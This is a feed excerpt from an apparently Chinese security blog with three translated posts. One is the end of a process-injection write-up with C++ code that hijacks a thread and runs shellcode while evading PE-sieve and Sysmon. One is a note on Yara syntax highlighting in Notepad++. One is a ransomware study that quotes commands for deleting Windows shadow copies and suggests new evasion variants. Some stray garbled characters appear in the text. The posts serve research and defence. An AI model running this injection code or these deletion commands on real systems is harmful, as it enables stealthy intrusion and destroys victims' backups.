class="comment">// Look for existing memory pages inside the executable image.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">for</span> (SIZE_T i = <span class="number">0</span>; i &lt; NtHeaders.OptionalHeader.SizeOfImage; i += MemoryBasicInfo.RegionSize) &#123;</span><br><span class="line">    <span class="built_in">VirtualQueryEx</span>(</span><br><span class="line">        ProcessHandle,</span><br><span class="line">        (LPBYTE)ImageBaseAddress + i,</span><br><span class="line">        &amp;MemoryBasicInfo,</span><br><span class="line">        <span class="built_in"><span class="keyword">sizeof</span></span>(MEMORY_BASIC_INFORMATION)</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Search for a RW region to act as the stack.</span></span><br><span class="line">    <span class="comment">// Note: It&#x27;s probably ideal to look for a RW section </span></span><br><span class="line">    <span class="comment">// inside the executable image memory pages because</span></span><br><span class="line">    <span class="comment">// the padding of sections suits the fifth, optional</span></span><br><span class="line">    <span class="comment">// argument for ReadProcessMemory and WriteProcessMemory.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (MemoryBasicInfo.Protect &amp; PAGE_READWRITE) &#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Stack location in RW page starting at the bottom.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到正确的页面后，应从页面底部向上枚举堆栈的位置（由于堆栈的性质），并且应该为 ReadProcessMemory 的第五个参数找到一个 0x0000000000000000 的值。 这意味着我们需要确保堆栈偏移量距底部加 Shellcode 的空间至少为 0x28。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">                   +--------------+</span><br><span class="line">                   |     ...      |</span><br><span class="line">                   +--------------+ -0x30</span><br><span class="line">    Should be 0 -&gt; |     arg5     |</span><br><span class="line">                   +--------------+ -0x28</span><br><span class="line">                   |     arg4     |</span><br><span class="line">                   +--------------+ -0x20</span><br><span class="line">                   |     arg3     |</span><br><span class="line">                   +--------------+ -0x18</span><br><span class="line">                   |     arg2     |</span><br><span class="line">                   +--------------+ -0x10</span><br><span class="line">                   |     arg1     |</span><br><span class="line">                   +--------------+ -0x8</span><br><span class="line">                   |     ret      |</span><br><span class="line">                   +--------------+ 0x0</span><br><span class="line">                   |   Shellcode  |</span><br><span class="line">Bottom of stack -&gt; +--------------+ </span><br></pre></td></tr></table></figure><p>下面是一些演示代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Allocate a stack to read a local copy.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">Stack = <span class="built_in">HeapAlloc</span>(<span class="built_in">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, AddressSize);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Scan stack for NULL fifth arg</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">Success = <span class="built_in">ReadProcessMemory</span>(</span><br><span class="line">    ProcessHandle,</span><br><span class="line">    Address,</span><br><span class="line">    Stack,</span><br><span class="line">    AddressSize,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Enumerate from bottom (it&#x27;s a stack).</span></span><br><span class="line"><span class="comment">// Start from -5 * 8 =&gt; at least five arguments + shellcode.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">for</span> (SIZE_T i = AddressSize - <span class="number">5</span> * <span class="built_in"><span class="keyword">sizeof</span></span>(SIZE_T) - <span class="built_in"><span class="keyword">sizeof</span></span>(Shellcode); i &gt; <span class="number">0</span>; i -= <span class="built_in"><span class="keyword">sizeof</span></span>(SIZE_T)) &#123;</span><br><span class="line">    ULONG_PTR* StackVal = (ULONG_PTR*)((LPBYTE)Stack + i);</span><br><span class="line">    <span class="keyword">if</span> (*StackVal == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Get stack offset.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        *StackOffset = i + <span class="number">5</span> * <span class="built_in"><span class="keyword">sizeof</span></span>(SIZE_T);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果可执行文件的模块内没有 RW 页面，则可以执行后备操作以写入堆栈。 要查找远程进程的堆栈，我们可以执行以下操作：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">NtQueryInformationThread</span>(</span><br><span class="line">    ThreadHandle,</span><br><span class="line">    ThreadBasicInformation,</span><br><span class="line">    &amp;ThreadBasicInfo,</span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(THREAD_BASIC_INFORMATION),</span><br><span class="line">    &amp;ReturnLength</span><br><span class="line">);</span><br><span class="line"><span class="built_in">ReadProcessMemory</span>(</span><br><span class="line">    ProcessHandle,</span><br><span class="line">    ThreadBasicInfo.TebBaseAddress,</span><br><span class="line">    &amp;Tib,</span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(NT_TIB),</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Get stack offset.</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>Tib 中的结果将包含堆栈范围地址。 有了这些值，我们可以在使用代码之前从堆栈底部开始定位适当的偏移量。</p><h3 id="写入-ShellCode"><a href="#写入-ShellCode" class="headerlink" title="写入 ShellCode"></a>写入 ShellCode</h3><p>No Allocation 的主要问题是我们必须编写 ShellCode，然后在同一页面中执行它。 有一种方法可以不使用 VirtualProtectEx 或具有此特殊功能的复杂 ROP 链：WriteProcessMemory。 好的，我确实说过我们不能使用 WriteProcessMemory 将数据从我们的进程写入目标，但是我没有说我们不能强迫目标进程自己使用它。WriteProcessMemory 内部的隐藏机制之一是，它将相应地重新保护目标缓冲区的页面以执行写操作。 在这里，我们看到使用 NtQueryVirtualMemory 查询目标缓冲区的页面：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/8AB2CE60AFE4B834E457A8949860FF1E.png" alt=""></p><p>然后使用 NtProtectVirtualMemory 对页面进行写保护：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/B029BE46925D6AE3531CE2FED28FC700.png" alt=""></p><p>如果您已经注意到，WriteProcessMemory 会在函数开始时修改 shadow 堆栈。 在这种情况下，我们需要修改 ShellCode 以填充 shadow 堆栈：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">BYTE Shellcode[] = &#123;</span><br><span class="line">    <span class="comment">// Placeholder for ret from ReadProcessMemory to infinte jmp loop.</span></span><br><span class="line">    <span class="number">0xEF</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0xDE</span>, <span class="number">0xEF</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0xDE</span>,</span><br><span class="line">    <span class="comment">// Pad for shadow stack.</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// Shellcode starts here at Shellcode + 0x30...</span></span><br><span class="line">    <span class="number">0xEB</span>, <span class="number">0xFE</span>, <span class="number">0x01</span>, <span class="number">0x23</span>, <span class="number">0x45</span>, <span class="number">0x67</span>, <span class="number">0x89</span>, <span class="number">0xAA</span>,</span><br><span class="line">    <span class="number">0xBB</span>, <span class="number">0xCC</span>, <span class="number">0xDD</span>, <span class="number">0xEE</span>, <span class="number">0xFF</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>现在我们需要依次调用 ReadProcessMemory 和 WriteProcessMemory。 回到 ReadProcessMemory 的返回中，我们可以简单地跳回到无限 jmp 循环小工具以暂停执行，而不是停止执行 ShellCode（现在位于不可执行的页面）：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/0F7ADBEDB8FC310D3D736DE63C7DF705.png" alt=""></p><p>这使得恶意进程有时间调用另一个 SetThreadContext 将 RIP 设置为 WriteProcessMemory 并重用 ReadProcessMemory 中的 RSP。 我们可以从 ReadProcessMemory 复制的同一位置读取 ShellCode（将 0x30 字节复制到实际的 ShellCode），然后将具有执行许可权的任何页面作为目标（同样，假设有 RX 节）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Get target process to write the shellcode</span></span><br><span class="line">Success = <span class="built_in">SetExecutionContext</span>(</span><br><span class="line">    &amp;ThreadHandle,</span><br><span class="line">    <span class="comment">// Set rip to read our shellcode</span></span><br><span class="line">    &amp;_WriteProcessMemory,</span><br><span class="line">    <span class="comment">// RSP points to same stack offset</span></span><br><span class="line">    &amp;StackLocation,</span><br><span class="line">    <span class="comment">// RCX: Target process&#x27; own handle</span></span><br><span class="line">    (HANDLE)<span class="number">-1</span>,</span><br><span class="line">    <span class="comment">// RDX: Buffer to store shellcode</span></span><br><span class="line">    ShellcodeLocation,</span><br><span class="line">    <span class="comment">// R8: Address to write from</span></span><br><span class="line">    (LPBYTE)StackLocation + <span class="number">0x30</span>,</span><br><span class="line">    <span class="comment">// R9: size to write</span></span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(Shellcode) - <span class="number">0x30</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>当 WriteProcessMemory 返回时，它应再次返回到无限 jmp 循环，从而允许恶意进程对 SetThreadContext 进行最终调用以执行 ShellCode：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Execute the shellcodez</span></span><br><span class="line">Success = <span class="built_in">SetExecutionContext</span>(</span><br><span class="line">    &amp;ThreadHandle,</span><br><span class="line">    <span class="comment">// Set RIP to execute shellcode</span></span><br><span class="line">    &amp;ShellcodeLocation,</span><br><span class="line">    <span class="comment">// RSP is optional</span></span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="comment">// Arguments to shellcode are optional</span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>总体而言，整个注入过程如下：</p><ol><li>将 SetThreadContext 设置为无限的 jmp 循环，以允许 SetThreadContext 可靠地使用易失性寄存器；</li><li>找到一个有效的 RW 堆栈（或伪堆栈）以承载 ReadProcessMemory 和 WriteProcessMemory 参数以及临时的 ShellCode；</li><li>使用 DuplicateHandle 为目标进程注册一个重复的句柄，以从恶意进程中读取 ShellCode；</li><li>使用 SetThreadContext 调用 ReadProcessMemory 复制 ShellCode；</li><li>在 ReadProcessMemory 之后返回无限 jmp 循环；</li><li>使用 SetThreadContext 调用 WriteProcessMemory 将 ShellCode 复制到 RX 页面；</li><li>在 WriteProcessMemory 之后返回无限 jmp 循环；</li><li>使用 SetThreadContext 调用 ShellCode；</li></ol><h2 id="关于检测"><a href="#关于检测" class="headerlink" title="关于检测"></a>关于检测</h2><p>为了快速测试隐蔽性能，我使用了两个工具：hasherazade 的 PE-sieve 和 Sysinternal 的 Sysmon。 如果还有其他防御性监视工具，我很想看看这种技术与它们对抗的能力。</p><h3 id="PE-sieve"><a href="#PE-sieve" class="headerlink" title="PE-sieve"></a>PE-sieve</h3><p>我在玩 PE-sieve 时注意到的一点是，如果我们将 ShellCode 注入到 .text（或其他相关部分）的填充中，则根本不会检测到它：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/FC5498FEF7E65DEFE01AAA575815E383.png" alt=""></p><p>如果 ShellCode 太大而无法填充，则另一个模块可能包含更大的空间。</p><h3 id="Sysmon-事件"><a href="#Sysmon-事件" class="headerlink" title="Sysmon 事件"></a>Sysmon 事件</h3><p>这些是使用 CreateProcess 调用而不是 OpenProcess 生成目标进程的预期结果。其他需要注意的是，DuplicateHandle 调用可能会触发 Sysmon 中 ObRegisterCallbacks 的进程句柄事件。并非如此，因为如果拥有相同句柄的进程执行了句柄访问，则 Sysmon 不会跟随该事件。 对于 AV 或 EDR，可能有所不同。</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/CE95F26A8415571143CB56743893016F.png" alt=""></p><h3 id="进一步改进"><a href="#进一步改进" class="headerlink" title="进一步改进"></a>进一步改进</h3><p>自从我真正着手完成这个（副项目）项目以来，我不会怀疑可能会忽略一些问题 – 我只需要探索这个想法，看看我能走多远。 关于恢复被劫持线程的执行，有可能并且我已经在 PoC 中实现了它，但是它取决于恶意进程，这可能是好事，也可能不是好事。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>因此，有可能不使用恶意进程中的 WriteProcessMemory，VirtualAllocEx，VirtualProtectEx，CreateRemoteThread，NtCreateThreadEx，QueueUserApc 和 NtQueueApcThread 来注入远程进程。 OpenProcess 和 OpenThread 的用法仍然值得商榷，因为有时使用 CreateProcess 生成目标进程并不总是这种情况。但是，它确实消除了许多可疑 call，这是此技术的目标。</p><p>由于 SetThreadContext 是一个如此强大的原始函数，并且对该函数和其他许多隐秘技术至关重要，因此是否会对此进行更多关注？ 从我所看到的，Microsoft-Windows-Kernel-Audit-API-Calls ETW 提供程序中已经有可用的本机 Windows 日志记录。 我有兴趣了解进程注入的未来 …</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文翻译自：&lt;a href=&quot;https://undev.ninja/nina-x64-process-injection/&quot;&gt;https://undev.ninja/nina-x64-process-injection/&lt;/a&gt;&lt;/p&gt;
&lt;/bl</summary>
      
    
    
    
    <category term="安全技术" scheme="https://zeronohacker.github.io/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="NINA" scheme="https://zeronohacker.github.io/tags/NINA/"/>
    
    <category term="Inject" scheme="https://zeronohacker.github.io/tags/Inject/"/>
    
  </entry>
  
  <entry>
    <title>Notepad++ 中让 Yara 语法高亮</title>
    <link href="https://zeronohacker.github.io/2020/05/31/make-yara-syntax-highlighting-in-notepad-plus-plus/"/>
    <id>https://zeronohacker.github.io/2020/05/31/make-yara-syntax-highlighting-in-notepad-plus-plus/</id>
    <published>2020-05-31T09:55:10.000Z</published>
    <updated>2021-09-19T10:02:35.381Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>项目地址：<a href="https://github.com/DissectMalware/npp-langs-4-sec">https://github.com/DissectMalware/npp-langs-4-sec</a></p></blockquote><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>该项目旨在将语法高亮显示功能引入网络安全从业人员使用的诸如 Yara 之类的语言的 Notepad ++。</p><h2 id="Yara-语言"><a href="#Yara-语言" class="headerlink" title="Yara 语言"></a>Yara 语言</h2><p>yara-byDissectMalware.xml 是一个 Notepad ++ UDL 文件，用于为 Yara 规则定义语法高亮显示。扩展名为 .yar 或 .yara 的文件将根据此 UDL 文件自动高亮显示。如果 Yara 文件不以该扩展名结尾，则可以转到 “Language” 菜单，然后从子菜单中选择 “Yara”。</p><p><img src="https://image.zeronohacker.com/article/2020/05/31/531fcd38149616bfc0a386e880c7b866.png" alt=""></p><h2 id="XLM-语言"><a href="#XLM-语言" class="headerlink" title="XLM 语言"></a>XLM 语言</h2><p>xlm-byDissectMalware.xml 是一个 Notepad ++ UDL 文件，用于定义 XLM 宏（又称 Excel 4.0 宏）的语法高亮显示。扩展名为 .xlm 的文件将根据此 UDL 文件自动高亮显示。如果 XLM 文件不以该扩展名结尾，则可以转到 “Language” 菜单，然后从子菜单中选择 “XLM”。</p><p><img src="https://image.zeronohacker.com/article/2020/05/31/37d9e0320253c54a6051ef855d79b03b.png" alt=""></p><h2 id="如何安装"><a href="#如何安装" class="headerlink" title="如何安装"></a>如何安装</h2><p>打开 Notepad++，选择 Language -&gt; User Defined Language -&gt; Define your language …</p><p><img src="https://image.zeronohacker.com/article/2020/05/31/ad2a6b8cfee41fb976cd636112c3b73c.png" alt=""></p><p>导入 UDL 文件，重新打开 Notepad++ 生效。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/DissectMalware/npp-langs-4-sec&quot;&gt;https://github.com/DissectMalware/npp-langs-4-sec&lt;/a&gt;&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="工具源码" scheme="https://zeronohacker.github.io/categories/%E5%B7%A5%E5%85%B7%E6%BA%90%E7%A0%81/"/>
    
    
    <category term="Yara" scheme="https://zeronohacker.github.io/tags/Yara/"/>
    
    <category term="Notepad++" scheme="https://zeronohacker.github.io/tags/Notepad/"/>
    
  </entry>
  
  <entry>
    <title>卷影副本删除方法再研究</title>
    <link href="https://zeronohacker.github.io/2020/04/29/stomping-shadow-copies-a-second-look-in-to-deletion-methods/"/>
    <id>https://zeronohacker.github.io/2020/04/29/stomping-shadow-copies-a-second-look-in-to-deletion-methods/</id>
    <published>2020-04-29T09:39:00.000Z</published>
    <updated>2021-09-19T09:48:07.459Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文翻译自：<a href="https://www.fortinet.com/blog/threat-research/stomping-shadow-copies-a-second-look-into-deletion-methods.html">https://www.fortinet.com/blog/threat-research/stomping-shadow-copies-a-second-look-into-deletion-methods.html</a></p></blockquote><h2 id="前述"><a href="#前述" class="headerlink" title="前述"></a>前述</h2><p>在最近几年，勒索软件对组织机构来说成了一种非常大的威胁，并给其造成了巨大的损失，估计达数十亿美元。为了提高勒索成功率，勒索软件执行的常见操作是擦除卷备份（即卷影副本），从而阻止受害者恢复已加密的任何文件。</p><p>在本博客中，我们回顾了勒索软件用于删除卷影副本的现有方法，以便能让防御者对他们需要保护的资源所用到的技术有一个大致的了解。除此之外，我们还介绍了勒索软件可能使用的新方法。这些新方法将能够让防御者为潜在的威胁部署适当的检测方案，因为在野外遇到它们只是时间问题。</p><h2 id="VSS-体系结构"><a href="#VSS-体系结构" class="headerlink" title="VSS 体系结构"></a>VSS 体系结构</h2><p>在我们开始之前，读者需要对关于卷影拷贝体系结构中几个关键性概念有所了解。</p><h3 id="Volume-Shadow-Copy-Service（VSS）"><a href="#Volume-Shadow-Copy-Service（VSS）" class="headerlink" title="Volume Shadow Copy Service（VSS）"></a>Volume Shadow Copy Service（VSS）</h3><p>该 Service 负责协调执行卷影拷贝相关操作的实体（例如相关的 Writers 和 Providers）之间的所有操作。VSS 是使用 COM（组件对象模型）技术实现的，读者应该对本文的后半部分有个基本的了解。</p><h3 id="VSS-Writers"><a href="#VSS-Writers" class="headerlink" title="VSS Writers"></a>VSS Writers</h3><p>这些组件负责提供通过 VSS Service 备份的稳定数据管道。Windows 列出了各种软件组件的 “内置 VSS Writers”。</p><h3 id="VSS-Providers"><a href="#VSS-Providers" class="headerlink" title="VSS Providers"></a>VSS Providers</h3><p>这些组件创建并维护实际的卷影副本对象。Providers 主要类型有两种：“硬件 Providers” 和 “软件 Providers”</p><h3 id="组件及其之间的关系"><a href="#组件及其之间的关系" class="headerlink" title="组件及其之间的关系"></a>组件及其之间的关系</h3><p>VSS 体系结构图说明了组件及其之间的关系，如下图所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/29/3B39E0717D6A99C734B0DCC697E6E8FD.png" alt=""></p><h2 id="System-Providers"><a href="#System-Providers" class="headerlink" title="System Providers"></a>System Providers</h2><p>System Providers 是 Windows 上的默认提供程序，目前已实现为软件提供程序。 在处理卷影副本删除尝试时，它是最常见的目标。 System Providers 采用写时复制（C-o-W）机制，因此快照仅保存在卷上进行的更改。 这些更改将保存在指定的“差异区域”存储位置，该位置通常位于同一卷上。 但是，它们也可以保存在任何足以容纳它们的 NTFS 卷上。</p><h2 id="存在的删除方法"><a href="#存在的删除方法" class="headerlink" title="存在的删除方法"></a>存在的删除方法</h2><p>有两种删除卷影副本的方法。 第一种是使用命令行实用程序或以编程方式以各种方式（我们将在本文稍后介绍）明确删除卷影副本。</p><p>第二种方法采用间接途径，因为它依赖于可以控制“差异区域”大小的事实。 如果现有快照超过新调整大小的差异区域的大小，则提供程序将删除快照以释放空间，如下图中的文档所述。（请注意，可设置的最小大小为 320 MB）。</p><p>请注意，使用 VSS 需要管理员特权。</p><p>两个可以管理 VSS 的著名命令行实用程序：vssadmin.exe（从 Windows XP 开始与每个全新的 Windows 安装一起提供）和 WMIC.exe（WMI 命令行），可以提供对 VSS 的访问。 Windows 管理规范。 随着时间的流逝，行为者逐渐发展了对这些实用程序的使用，以抵抗防御者的侦查。</p><p>第一种也是最常用的方法是使用 delete 命令运行 vssadmin：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin delete shadows /all /quiet</span><br></pre></td></tr></table></figure><p>使用此方法观察到的一些臭名昭著的勒索软件系列是 Ryuk，WannaCry，Dharma，RobinHood，Hermes，Phobos 和 Locky。</p><p>在此方法广为人知并加以防御之后，攻击者开始使用 WMIC.exe 通过以下参数删除卷影副本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic shadowcopy delete /nointeractive</span><br></pre></td></tr></table></figure><p>这种方法在勒索软件作者中也非常流行，并且被 GandCrab，Robinhood，Phobos，LockBit，Rapid 和 JCry 使用。</p><p>另一方面，与前两种方法相比，调整大小是勒索软件家族中一个相对较新的方法，即使在 vssdamin 中也进行了调整，但在野外也不常见：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin resize shadowstorage /for=&lt;backed volume&gt; /on=&lt;backup location volume&gt; /maxsize=&lt;new size&gt;</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2020/04/29/BE38B6E8DC3FC09407FB934E43AE454D.png" alt=""></p><p>一些勒索软件系列使用了这种方法，例如 Nemty，Ryuk，Hermes，Rap][23fdscid 和 MegaCortex（唯一实际使用最小大小的勒索软件），并且我们希望在将来看到更广泛的使用。</p><p>这种方法的问题在于，我们不一定知道在 diff 区域中使用了多少空间，这可能会导致这样的情况：尽管调整了大小，但某些快照仍可能无法删除。由于系统提供者使用 C-o-W，因此更改会在发生更改时以及创建快照之前保存到差异区域。为克服此问题，在调整大小操作之后，应在差异区域中填充等于或大于其缩小大小的数据，然后创建新快照以触发删除所有现有快照。</p><p>勒索软件作者的最新创新在于，他们倾向于直接从其代码（或脚本）中调用卷影副本的删除。勒索软件偏向于运行 PowerShell 一线式，只需一行简fds-32单的代码即可枚举和删除卷影副本的所有实例。</p><p>通过 WMI 的 Win32_ShadowCopy 类和有用的 PowerShell cmdlet 可以方便地实现此目的，以访问 WMI 对象，如以下示例所示：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> Win32_ShadowCopy | % &#123; <span class="variable">$_</span>.Delete() &#125;</span><br><span class="line"><span class="built_in">Get-WmiObject</span> Win32_ShadowCopy | <span class="built_in">Remove-WmiObject</span></span><br></pre></td></tr></table></figure><p>Nemty 和 Sodinokibi 使用 Get-WmiObject cmdlet。 Sodinokibi 将 PowerShell 作为子进程运行，该进程具有 base64 编码的命令行参数，该参数解码为：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> Win32_Shadowcopy | <span class="built_in">ForEach-Object</span> &#123; <span class="variable">$_Delete</span>(); &#125;</span><br></pre></td></tr></table></figure><p>在下一节中，我们将介绍尚未发现的 ITW 删除方法。</p><h2 id="新的删除方法"><a href="#新的删除方法" class="headerlink" title="新的删除方法"></a>新的删除方法</h2><p>在本节中，我们讨论了删除卷副本的新方法，这些副本将来可能被勒索软件使用。 第一种方法提供了其他 PowerShell 技巧来触发删除，而第二种方法和第三种方法则利用了 VSS 体系结构的行为和内部工作原理。</p><h3 id="PowerShell-Tradecraft"><a href="#PowerShell-Tradecraft" class="headerlink" title="PowerShell Tradecraft"></a>PowerShell Tradecraft</h3><p>尽管我们还没有遇到任何使用此工具的勒索软件，但可以使用 CIM cmdlet 代替 WMI cmdlet：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> Win32_ShadowCopy | <span class="built_in">Remove-CimInstance</span></span><br></pre></td></tr></table></figure><p>在远程计算机上进行基于 CIM 的调用时，它们将通过 WinRM 而不是 DCOM 发送。PowerShell cmdlet 还支持别名。 有些是内置的，例如 gwmi 用于 Get-WmiObject 或 gcim 用于 Get-CimInstance。 可以通过 New-Alias cmdlet 创建新的，而可以使用 Set-Alias cmdlet 修改现有的。</p><p>也可以在没有 PowerShell.exe 二进制文件的情况下运行 PowerShell 脚本。 某些 LOLBins 可以执行 Powershell 脚本。 例如SyncAppvPublishingServer.exe。 这些二进制文件的优点是它们可以绕过应用程序黑名单防御。</p><p>除了将已知的主机进程用于 PowerShell Core，还可以使用 .NET Framework 在您自己的进程中执行 PowerShell 脚本。 一些工具已经实现了它（UnmanagedPowerShell 和 SharpPick）。</p><h3 id="调用-COM-对象"><a href="#调用-COM-对象" class="headerlink" title="调用 COM 对象"></a>调用 COM 对象</h3><p>WMI 可以通过 COM 而不是命令行工具或 PowerShell 通过编程方式使用，并且正如我们前面提到的，VSS 体系结构本身是基于 COM 的，因此可以使用更直接的方法直接操作那些对象。</p><p>如果我们看一下 vssadmin 的内幕，我们很快就会注意到它使用带有 IVssCoordinator 接口的 VSSCoordinator COM 类向 VSS 服务发出删除请求。 该对象在名为 vss_ps.dll 的代理 DLL 中实现。</p><p><img 